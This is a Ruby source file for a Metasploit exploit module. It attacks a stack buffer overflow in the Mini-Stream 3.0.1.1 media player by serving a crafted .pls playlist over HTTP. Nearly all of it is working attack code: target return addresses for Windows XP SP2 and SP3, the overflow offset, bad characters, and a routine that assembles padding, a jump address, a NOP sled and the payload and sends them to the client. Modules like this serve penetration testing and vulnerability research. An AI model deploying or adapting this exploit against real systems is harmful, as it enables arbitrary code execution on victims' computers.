##
# $Id: mini_stream.rb 14155 2011-11-04 08:20:43Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			\'Name\' => \'Mini-Stream 3.0.1.1 Buffer Overflow Exploit\',
			\'Description\' => %q{
					This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1
				By creating a specially crafted pls file, an an attacker may be able
				to execute arbitrary code.
			},
			\'License\' => MSF_LICENSE,
			\'Author\' =>
				[
					\'CORELAN Security Team \',
					\'Ron Henry <rlh[at]ciphermonk.net>\', # dijital1; Return address update
				],
			\'Version\' => \'$Revision: 14155 $\',
			\'References\' =>
				[
					[ \'OSVDB\', \'61341\' ],
					[ \'URL\', \'http://www.exploit-db.com/exploits/10745\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\' =>
				{
					\'Space\' => 3500,
					\'BadChars\' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x26\\x3d\\x2b\\x3f\\x3a\\x3b\\x2d\\x2c\\x2f\\x23\\x2e\\x5c\\x30\",
					\'StackAdjustment\' => -3500
				},
			\'Platform\' => \'win\',
			\'Targets\' =>
				[
					[
						\'Windows XP SP3 ENG\',
						{
							\'Ret\'    => 0x7e429353,  # 0x7e429353 JMP ESP - USER32.dll
							\'Offset\' => 17417
						}
					],
					[
						\'Windows XP SP2 ENG\',
						{
							\'Ret\'    => 0x7c941eed,  # 0x7c941eed JMP ESP - SHELL32.dll
							\'Offset\' => 17417
						}
					]
				],
			\'Privileged\' => false,
			\'DisclosureDate\' => \'Dec 25 2009\',
			\'DefaultTarget\' => 0))

		register_options(
			[
				OptString.new(\'URIPATH\',  [ true,  \'The URI to use for this exploit\', \'msf.pls\'])
			], self.class)
	end


	def on_request_uri(cli, request)
		# Calculate the correct offset
		host = (datastore[\'SRVHOST\'] == \'0.0.0.0\') ? Rex::Socket.source_address(cli.peerhost) : datastore[\'SRVHOST\']
		host << \":#{datastore[\'SRVPORT\']}/\"
		offset = target[\'Offset\'] - host.length

		# Construct our buffer
		sploit = rand_text_alpha(offset)
		sploit << [target.ret].pack(\'V\')
		sploit << make_nops(32)
		sploit << @p

		print_status(\"Sending malicous payload #{cli.peerhost}:#{cli.peerport}...\")
		send_response(cli, sploit, {\'Content-Type\'=>\'application/pls+xml\'})
	end

	def exploit
		@p = payload.encoded
		super
	end

end
